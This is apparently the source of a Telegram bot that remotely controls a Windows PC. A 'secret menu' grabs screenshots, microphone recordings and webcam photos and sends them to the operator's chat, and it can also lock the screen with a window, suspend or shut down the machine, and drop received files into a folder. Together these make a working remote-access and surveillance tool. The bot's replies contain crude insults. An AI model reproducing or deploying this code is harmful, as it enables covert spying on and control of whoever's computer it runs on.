
import record
import menu
import camera
import window
import os
from aiogram import Bot, Dispatcher, executor, types
from aiogram.types import *
import threading #потоки
import tempfile
from PIL import ImageGrab
import config
 

token = config.telegram_bot_token
my_id = config.my_id_telegram
ids=[my_id]
bot = Bot(token=token)
dp = Dispatcher(bot)


file = config.dir#директория для сохранения папок

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    if(message.from_id in ids):
        await message.reply("salam")
    else:
        await message.reply("помойся иди, чорт")

@dp.message_handler(commands=['myId'])
async def send_welcome(message: types.Message):
    await message.answer("Чо хаха ловишь. Это твой id ")
    await message.answer( message.from_id)
    
@dp.message_handler(commands=['secret'])
async def what(message: types.Message):
    if(message.from_id==my_id):
        kb = [
        [types.KeyboardButton(text="/screen")],
        [types.KeyboardButton(text="/get_micro")],
        [types.KeyboardButton(text="/get_camera")],
        [types.KeyboardButton(text="/block")],
        [types.KeyboardButton(text="/slomat_bot")],
        [types.KeyboardButton(text="/sleep")],
        [types.KeyboardButton(text="/of")],
        ]
        keyboard = types.ReplyKeyboardMarkup(keyboard=kb,resize_keyboard=True,input_field_placeholder=".txt")
        await message.answer("Cекретное меню",reply_markup=keyboard)
    else:
        await message.answer("Siktir eli")


@dp.message_handler(commands=['block'])
async def blocked(message: types.Message):
    # window.createWindow()
    if(message.from_id==my_id):
        await message.answer("Заблочил гада")
        th = threading.Thread(target=window.createWindow)
        th.start()
    
@dp.message_handler(commands=['slomat_bot'])
async def unBlocked(message: types.Message):
    if(message.from_id==my_id):    
        await message.answer("Бот пал смертью храбрых😭")
        window.deleteWindow()

@dp.message_handler(commands=['sleep'])
async def sleep(message: types.Message):
    if(message.from_id==my_id):
        await message.answer("Вырубаю к херам...")
        os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@dp.message_handler(commands=['of'])
async def off(message: types.Message):
    if(message.from_id==my_id):
        await message.answer("Да пиздец, настолько меня не любишь?")
        os.system("shutdown -s -t 0")
    
@dp.message_handler(commands=['screen'])
async def getScreen(message: types.Message):
    if(message.from_id==my_id):
        await message.answer("щас скину")
        path = tempfile.gettempdir() + 'screenshot.png'
        screenshot = ImageGrab.grab()
        screenshot.save(path, 'PNG')
        await bot.send_photo( message.chat.id,open(path, 'rb'))
        await message.answer("На")


@dp.message_handler(commands=['get_micro'])
async def getScreen(message: types.Message):
    if(message.from_id==my_id):
        await message.answer("Начинаю запись микрофона...")
        path_voice = record.recording()
        await bot.send_audio(message.chat.id,open(path_voice,'rb'))
        record.delete(path_voice)


@dp.message_handler(commands=['get_camera'])
async def getScreen(message: types.Message):
    if(message.from_id==my_id):
        await message.answer("Отправляю фотографию с камеры...")
        path_web= camera.camera()
        await bot.send_photo(message.chat.id,open(path_web,'rb'))
        record.delete(path_web)



@dp.message_handler(content_types=['photo','video','document','voice'])
async def handle_photo(message: types.Message):
    # Получаем объект фотографии
    if(message.from_id in ids):
        if(message.content_type=="photo"):
            photo = message.photo[-1]
            await photo.download(destination_dir=file)
            await message.answer("Cкачал" )
        
        elif(message.content_type=="video"):
               video = message.video
               await video.download(destination_dir=file)
               await message.answer("Cкачал" )
               
        elif(message.content_type=="document"):
               doc = message.document
               await doc.download(destination_dir=file)
               await message.answer("Cкачал")
               
        elif(message.content_type=="voice"):
               doc = message.voice
               await doc.download(destination_dir=file)
               await message.answer("Cохранил" )
               
    else:
        await message.answer("Получи ID, через меню. Обратись к админу")


@dp.message_handler(commands="open")
async def what(message: types.Message):
    if(message.from_id in ids):
        b0 = types.KeyboardButton(text="google")
        b1 = types.KeyboardButton(text="youtube")
        b2 = types.KeyboardButton(text="vk")
        b3 = types.KeyboardButton(text="⬅️")
        b4 = types.KeyboardButton(text="space")
        b5 = types.KeyboardButton(text="➡️")
        b6 = types.KeyboardButton(text="❌")
        b7 = types.KeyboardButton(text="🤣")
        
        keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)#keyboard=kb
        keyboard.row(b0,b1,b2)
        keyboard.row(b3,b4,b5,b6)
        keyboard.add(b7)
        
        await message.answer("меню готово",reply_markup=keyboard)
    else:
        await message.answer("Siktir eli")
    
@dp.message_handler()
async def interceptors(message:types.Message):
    if(message.from_id in ids):
        menu.event(message.text)
        await message.reply("Ok")
    else:
        await message.answer("Siktir eli")
        

executor.start_polling(dp, skip_updates=True)
